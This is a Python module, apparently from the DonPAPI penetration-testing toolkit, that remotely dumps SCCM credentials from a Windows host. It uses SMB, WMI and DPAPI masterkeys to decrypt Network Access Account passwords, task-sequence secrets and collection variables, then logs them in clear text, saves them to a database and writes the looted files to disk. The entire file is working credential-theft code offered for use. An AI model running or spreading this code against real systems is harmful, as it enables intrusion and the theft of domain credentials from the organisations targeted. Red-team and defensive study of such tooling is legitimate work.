from typing import Any
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from dploot.triage.sccm import SCCMTriage, SCCMCred, SCCMSecret, SCCMCollection
from dploot.lib.utils import dump_looted_files_to_disk
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter


class SCCM:
    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore, false_positive: list, max_filesize: int) -> None:
        self.tag = self.__class__.__name__
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context
        self.false_positive = false_positive
        self.max_filesize = max_filesize

    def run(self):
        if self.context.remoteops_allowed:
            self.logger.display("Dumping SCCM Credentials")
            def sccm_callback(secret):
                if isinstance(secret,SCCMCred):
                    program = "NAA Account"
                    self.logger.secret(f"[{program}] {secret.username.decode('latin-1')}:{secret.password.decode('latin-1')}", self.tag)
                    self.context.db.add_secret(computer=self.context.host, collector=self.tag, windows_user="SYSTEM", username=secret.username.decode('latin-1'), password=secret.password.decode('latin-1'), program=program)
                if isinstance(secret,SCCMSecret):
                    program = "Task sequences secret"
                    self.logger.secret(f"[{program}] {secret.secret.decode('latin-1')}", self.tag)
                    self.context.db.add_secret(computer=self.context.host, collector=self.tag, windows_user="SYSTEM", password=secret.secret.decode('latin-1'), program=program)
                if isinstance(secret,SCCMCollection):
                    program = "Collection Variable"
                    self.logger.secret(f"[{program}] {secret.variable.decode('latin-1')}:{secret.value.decode('latin-1')}", self.tag)
                    self.context.db.add_secret(computer=self.context.host, collector=self.tag, windows_user="SYSTEM", username=secret.variable.decode('latin-1'), password=secret.value.decode('latin-1'), program=program)
            for wmi in [True,False]:
                sccm_triage = SCCMTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys, per_secret_callback=sccm_callback)
                sccm_triage.triage_sccm(use_wmi=wmi)
                dump_looted_files_to_disk(self.context.target_output_dir, sccm_triage.looted_files)